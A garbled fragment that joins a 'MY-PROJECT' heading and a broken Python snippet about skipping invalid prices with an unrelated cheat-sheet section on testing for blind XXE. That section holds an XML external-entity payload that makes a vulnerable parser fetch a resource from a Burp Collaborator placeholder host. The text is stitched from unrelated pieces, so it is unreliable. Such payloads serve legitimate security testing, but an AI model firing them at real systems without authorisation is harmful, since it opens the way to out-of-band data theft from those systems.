# MY-PROJECT
if price < 0:
    print(f"Warning: Skipping invalid price {price}")
    continue
    ### Basic Blind XXE
The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.
```xml
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
